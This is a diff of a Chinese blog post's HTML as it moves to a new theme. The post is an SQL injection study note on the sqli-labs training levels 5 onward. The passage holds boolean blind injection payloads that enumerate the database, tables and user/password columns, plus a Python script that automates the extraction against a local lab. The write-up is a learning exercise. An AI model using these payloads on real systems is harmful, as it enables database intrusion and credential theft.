@@ -1,568 +1,572 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
+
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-  <link rel="alternate" href="/atom.xml" title="Gee" type="application/atom+xml">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Gee">
+  <meta name="keywords" content="">
+  <title>sql注入笔记2（sqli-labs  5-30） - Gee</title>
 
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.5.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: '复制',
-      copy_success: '复制成功',
-      copy_failure: '复制失败'
-    },
-    sidebarPadding: 40
-  };
-</script>
-
-  <meta name="description" content="0x01  Less-5先输入id=1’ and 1=1报错了，输入id=1’ and ‘1’=’1,有回显，但是没有回显具体内容，所以猜测是字符型的布尔盲注。接下来就是猜库名猜测出库名第一个字母为s，然后用同样的方法，猜测出，第二个字母为e，然后以此类推，得到库名security1payload:?id=1&amp;apos; and substr(database(),x,1)=&amp;apos;xxx&amp;a">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sql注入笔记2（sqli-labs  5-30）">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;29&#x2F;sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B02&#x2F;index.html">
-<meta property="og:site_name" content="Gee">
-<meta property="og:description" content="0x01  Less-5先输入id=1’ and 1=1报错了，输入id=1’ and ‘1’=’1,有回显，但是没有回显具体内容，所以猜测是字符型的布尔盲注。接下来就是猜库名猜测出库名第一个字母为s，然后用同样的方法，猜测出，第二个字母为e，然后以此类推，得到库名security1payload:?id=1&amp;apos; and substr(database(),x,1)=&amp;apos;xxx&amp;a">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B723.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B724.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B725.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B722.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B726.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B721.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B727.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B728.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B729.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B730.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B731.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B754.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B759.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B761.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B760.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B762.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B763.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B764.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B765.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B766.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B767.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B768.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B770.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B771.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B772.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B773.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B774.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B775.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B776.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B777.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B778.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B779.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B780.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B781.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B782.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B783.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B784.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B785.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B786.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B787.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B788.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B789.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B790.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B791.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B792.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B793.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B794.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B795.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7143.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7145.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7147.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7146.JPG">
-<meta property="og:updated_time" content="2020-02-19T13:59:54.323Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B723.JPG">
-
-<link rel="canonical" href="http://yoursite.com/2019/11/29/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B02/">
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  <title>sql注入笔记2（sqli-labs  5-30） | Gee</title>
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
   
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
 
 
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+  <script  src="/js/utils.js" ></script>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
 
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Gee</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-
 </nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
 
-</div>
-<div class="search-pop-overlay"></div>
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
 
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
             
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2019-11-29 17:54">
+      2019年11月29日 下午
+    </time>
+  </div>
 
-  <div class="posts-expand">
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
       
+      
+      43
+       分钟
+    </span>
+  
+
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B02/">
+</div>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/1.jpg">
-      <meta itemprop="name" content="Gee">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Gee">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          sql注入笔记2（sqli-labs  5-30）
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-11-29 17:54:45" itemprop="dateCreated datePublished" datetime="2019-11-29T17:54:45+08:00">2019-11-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-19 21:59:54" itemprop="dateModified" datetime="2020-02-19T21:59:54+08:00">2020-02-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
-                    <span itemprop="name">sql注入</span>
-                  </a>
-                </span>
-            </span>
+            
+          </div>
 
           
-
         </div>
-      </header>
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-        <p>0x01  Less-5</p><p>先输入id=1’ and 1=1报错了，输入id=1’ and ‘1’=’1,有回显，但是没有回显具体内容，所以猜测是字符型的布尔盲注。<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B723.JPG" alt="picture"><br>接下来就是猜库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B724.JPG" alt="picture"><br>猜测出库名第一个字母为s，然后用同样的方法，猜测出，第二个字母为e，然后以此类推，得到库名security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?id=1&apos; and substr(database(),x,1)=&apos;xxx&apos;%23</span><br></pre></td></tr></table></figure><a id="more"></a>
 
-
-<p>然后开始猜测表名，这个比较麻烦，首先猜有几个表<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B725.JPG" alt="picture"><br>发现有四个表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?id=1&apos; and (select count(table_name) from information_schema.tables where table_schema=database())=x%23</span><br></pre></td></tr></table></figure>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <p>0x01  Less-5</p>
+<p>先输入id=1’ and 1=1报错了，输入id=1’ and ‘1’=’1,有回显，但是没有回显具体内容，所以猜测是字符型的布尔盲注。<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B723.JPG" srcset="/img/loading.gif" alt="picture"><br>接下来就是猜库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B724.JPG" srcset="/img/loading.gif" alt="picture"><br>猜测出库名第一个字母为s，然后用同样的方法，猜测出，第二个字母为e，然后以此类推，得到库名security</p>
+<pre><code class="hljs matlab">payload:?id=<span class="hljs-number">1</span>' and substr(database(),x,<span class="hljs-number">1</span>)=<span class="hljs-string">'xxx'</span><span class="hljs-comment">%23</span></code></pre>
+<p>然后开始猜测表名，这个比较麻烦，首先猜有几个表<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B725.JPG" srcset="/img/loading.gif" alt="picture"><br>发现有四个表</p>
+<pre><code class="hljs n1ql">payload:?id=1' and (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())=x%<span class="hljs-number">23</span></code></pre>
 <p>然后开始猜测每个表的名字，我们关键是要找一张users的表，因为一般这张表里有用户名和密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit x,1),x,1)=&apos;x&apos;%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B722.JPG" alt="picture"><br>搞了半天，发现第四张表是users，然后要开始猜字段名，方法跟猜表名差不多,输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?id=1&apos; and substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit x,1),x,1)=&apos;x&apos;%23</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs routeros">payload:?<span class="hljs-attribute">id</span>=1' <span class="hljs-keyword">and</span> substr((select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit x,1),x,1)=<span class="hljs-string">'x'</span>%23</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B722.JPG" srcset="/img/loading.gif" alt="picture"><br>搞了半天，发现第四张表是users，然后要开始猜字段名，方法跟猜表名差不多,输入</p>
+<pre><code class="hljs cs">payload:?id=<span class="hljs-number">1'</span> <span class="hljs-function">and <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span> limit x,<span class="hljs-number">1</span></span>),x,1)</span>=<span class="hljs-string">'x'</span>%<span class="hljs-number">23</span></code></pre>
 <p>，通过改变x的值来猜测各个列名，找到username和password两个列，最后开始报字段名id=1’  and substr((select group_concat(username/password) from security.users limit x,1),x,1)=’xxx’%23，但是这实在是太麻烦了<br>于是我去网上找了个布尔盲注的脚本来：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- encoding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA 猜库名</span></span><br><span class="line"><span class="comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'猜表名</span></span><br><span class="line"><span class="comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'猜列名</span></span><br><span class="line"><span class="comment">#select group_concat(password/username) from xxx.xxx猜字段名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span></span><br><span class="line">url=<span class="string">'http://localhost:8080/sqli-labs-master/Less-5/?id=1\' and '</span></span><br><span class="line">string=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        id=<span class="string">"substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = 'users' limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+"</span>.format(str(i),ascii(j))</span><br><span class="line">        <span class="comment">#print(id)</span></span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        <span class="comment">#print(url_get)</span></span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
-<p>参考博客<a href="https://uuzdaisuki.com/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://uuzdaisuki.com/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/</a><br>运行脚本，得到结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B726.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B721.JPG" alt="picture"><br>结果我看网上的wp发现，这道题好像不是考的不是布尔盲注，应该是报错注入！！关于什么是双注入查询，可以看看这篇文章:<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a><br>简单来说就是count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，通过构造双查询，使一个查询结果报错，另一个查询结果就会出现在报错信息中，具体做法是，多一个聚合函数<br>count(*)<br>暴库payload：</p>
